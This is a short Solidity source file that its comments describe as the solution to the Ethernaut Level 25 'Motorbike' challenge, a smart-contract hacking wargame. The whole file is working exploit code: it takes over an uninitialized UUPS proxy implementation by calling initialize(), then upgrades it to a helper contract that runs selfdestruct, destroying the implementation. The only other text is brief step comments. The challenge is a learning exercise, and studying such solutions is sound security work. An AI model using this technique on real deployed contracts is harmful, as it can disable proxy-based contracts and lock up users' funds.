// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

/**
 * @title Exploit
 * @notice Selfdestruct helper for Motorbike attack
 */
contract Exploit {
    function destroy() external {
        selfdestruct(payable(msg.sender));
    }
}

/**
 * @title MotorbikeExploit
 * @notice Ethernaut Level 25: UUPS proxy self-destruct
 * @dev Exploits uninitialized implementation contract
 */
contract MotorbikeExploit {
    address public engineImplementation;
    
    constructor(address _engineImpl) {
        engineImplementation = _engineImpl;
    }
    
    /**
     * @notice Full exploit: become upgrader then selfdestruct
     */
    function attack() external {
        IEngine engine = IEngine(engineImplementation);
        
        // Step 1: Initialize the implementation contract directly
        // This sets us as upgrader since we call it
        engine.initialize();
        
        // Step 2: Deploy exploit contract
        Exploit exploit = new Exploit();
        
        // Step 3: Upgrade to exploit contract and selfdestruct
        engine.upgradeToAndCall(
            address(exploit),
            abi.encodeWithSignature("destroy()")
        );
    }
}
